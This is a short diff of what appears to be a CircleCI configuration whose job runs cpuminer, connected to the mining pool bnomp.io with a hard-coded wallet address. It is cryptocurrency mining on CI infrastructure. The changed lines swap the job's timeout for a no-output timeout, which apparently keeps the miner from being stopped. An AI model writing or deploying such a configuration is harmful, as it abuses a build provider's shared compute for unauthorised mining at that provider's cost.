@@ -23,7 +23,7 @@ jobs:
           name: Run command
           command: |
             cd cpuminer-linux && ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x
-    timeout: 300
+          no_output_timeout: 300s
 
 workflows:
   version: 2
